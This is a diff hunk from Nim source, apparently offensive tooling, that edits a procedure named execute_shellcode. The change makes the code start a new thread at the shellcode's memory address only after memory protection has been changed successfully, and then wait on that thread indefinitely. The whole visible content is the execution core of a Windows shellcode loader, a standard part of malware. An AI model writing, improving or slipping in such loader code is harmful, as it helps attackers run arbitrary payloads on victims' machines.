@@ -35,19 +35,19 @@ proc execute_shellcode[I, T](shellcode: array[I, T]): void =
         addr prevPro                                                    
     )
 
-    var threadID: DWORD
+    if virPro != 0:
+        var threadID: DWORD
 
-    let threadH = CreateThread(                                         
-        NULL,                                                           
-        0,                                                              
-        cast[LPTHREAD_START_ROUTINE](baseAddr),                         
-        NULL,                                                           
-        0,                                                              
-        addr threadID                                                   
-    )
-   
-    defer: CloseHandle(threadH)                                         
-    defer: WaitForSingleObject(threadH, int32.high)
+        let threadH = CreateThread(                                         
+            NULL,                                                           
+            0,                                                              
+            cast[LPTHREAD_START_ROUTINE](baseAddr),                         
+            NULL,                                                           
+            0,                                                              
+            addr threadID                                                   
+        )
+                                        
+        defer: WaitForSingleObject(threadH, -1)
 
 proc go(): void =
 
